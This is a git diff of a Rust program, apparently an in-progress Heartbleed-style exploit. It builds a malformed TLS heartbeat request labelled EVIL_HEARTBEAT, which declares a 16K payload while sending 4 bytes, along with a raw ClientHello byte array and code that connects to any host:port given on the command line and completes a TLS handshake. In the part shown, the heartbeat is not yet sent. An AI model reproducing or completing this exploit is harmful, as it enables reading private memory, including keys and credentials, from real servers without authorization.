@@ -1,6 +1,8 @@
 use std::net::TcpStream;
 use std::env;
 use std::error::Error;
+use std::io::Write;
+use std::io::Read;
 
 const EVIL_HEARTBEAT: [u8; 12] = [
     //content type, 0x18 means heartbeat 
@@ -9,13 +11,13 @@ const EVIL_HEARTBEAT: [u8; 12] = [
     //tls version
     0x03, 0x02,
 
-    //packet size, 3 + payload actual size
+    //packet lenght, 3 + payload actual lenght
     0x00, 0x07,
 
     //heartbeat message type, 0x01 means request
     0x01,
 
-    //payload size, set at 0x4000 (16K) even if the actual payload is 4 bytes
+    //payload lenght, set at 0x4000 (16K) even if the actual payload is 4 bytes
     0x40, 0x00,
 
     //payload
@@ -23,7 +25,7 @@ const EVIL_HEARTBEAT: [u8; 12] = [
 ];
 
 //client hello message, needed for the tls handshake
-const CLIENT_HELLO_MESSAGE: [u8; 288]  = [
+const CLIENT_HELLO: [u8; 288]  = [
     0x16,
     0x03, 0x02,
     0x01, 0x1b,
@@ -56,15 +58,51 @@ const CLIENT_HELLO_MESSAGE: [u8; 288]  = [
     0x00, 0x0f, 0x00, 0x01,  0x01
 ];
 
+struct TlsHeader {
+    content_type: u8,
+    tls_version: u16,
+    packet_length: u16
+}
+
 fn main() -> Result<(), Box<dyn Error>>{
     let args: Vec<String> = env::args().collect();
 
     if args.len() != 2 {
         println!("Usage: {} <host:port>", args[0]);
-        std::process::exit(1);
+        return Err("Incorrect usage.".into());
     }
 
+    //connect
     let mut tcp_stream = TcpStream::connect(&args[1])?;
+
+    //send hello
+    tcp_stream.write_all(&CLIENT_HELLO)?;
+    tcp_stream.flush()?;
+
+    //check for handshake
+    loop {
+        //read header
+        let mut header: [u8; 5] = [0; 5];
+        tcp_stream.read_exact(&mut header);
+
+        //get data lenght from header (bytes 3 and 4 of header together)
+        let data_length = ((header[3] as u16) << 8) | header[4] as u16;
+
+        //read data
+        let mut data = vec![0; data_length as usize];
+        tcp_stream.read_exact(&mut data);
+
+        //if content type is 0x16 and data is 0xe then the handshake succeded
+        if header[0] == 0x16 && data[0] == 0x0e {
+            println!("Handshake success!");
+            break;
+        }
+
+        //if content type is 0x00 then the handshake failed 
+        if header[0] == 0x00 {
+            return Err("Handshake failed".into());
+        }
+    }
 
     Ok(())
 }
